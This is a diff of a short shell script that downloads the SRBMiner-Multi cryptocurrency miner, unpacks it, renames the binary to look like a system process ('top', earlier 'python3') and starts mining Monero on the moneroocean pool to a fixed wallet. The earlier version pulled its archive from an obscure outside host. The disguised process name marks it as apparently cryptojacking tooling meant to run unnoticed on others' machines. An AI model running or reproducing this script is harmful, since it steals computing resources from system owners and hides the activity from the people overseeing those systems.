@@ -1,9 +1,9 @@
-#!/bin/bash
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.6/SRBMiner-Multi-2-5-6-Linux.tar.gz
 
-wget -O dot momok.x10.bz/DOT-SRB.tar.gz
+tar -xf SRBMiner-Multi-2-5-6-Linux.tar.gz
 
-tar xvf dot
+cd SRBMiner-Multi-2-5-6
 
-nomer=$((RANDOM % 50 + 1))
+mv SRBMiner-MULTI top
 
-./dotsrb/python3 -a randomx -o gulf.moneroocean.stream:10032 -u  kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.luck-$nomer
+./top -a randomx -o gulf.moneroocean.stream:10032 -u  kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.lucky
